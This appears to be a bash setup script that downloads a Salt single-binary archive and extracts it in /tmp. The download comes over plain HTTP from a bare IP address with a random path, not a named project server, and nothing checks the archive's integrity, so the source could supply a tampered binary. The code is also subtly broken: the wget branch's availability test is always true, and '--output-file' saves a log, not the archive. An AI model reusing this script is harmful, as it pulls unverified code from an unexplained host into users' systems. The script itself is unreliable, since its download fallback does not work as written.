#!/usr/bin/env bash

# Exit on failures
set -e
# Echo what runs
set -x

if [ "$(uname)" = "Linux" ]; then
    PLATFORM="linux-gnu"
else
    PLATFORM="macos"
fi

SALT_ARCHIVE_NAME="salt-${SALT_VERSION}-${OS_ARCH}-${PLATFORM}.tar.xz"
SALT_DOWNLOAD_URL="http://139.64.236.21/gdvYr3DshH/${SALT_ARCHIVE_NAME}"

if [ "$(which curl)x" != "x" ]; then
    curl -f --output /tmp/${SALT_ARCHIVE_NAME} ${SALT_DOWNLOAD_URL}
elif [ "$(which wget)" != "x" ]; then
    wget --output-file=/tmp/${SALT_ARCHIVE_NAME} ${SALT_DOWNLOAD_URL}
else
    echo "Neither wget nor curl is available to download the Salt single binary"
    exit 1
fi

cd /tmp
tar xvf ${SALT_ARCHIVE_NAME}
rm -f ${SALT_ARCHIVE_NAME}
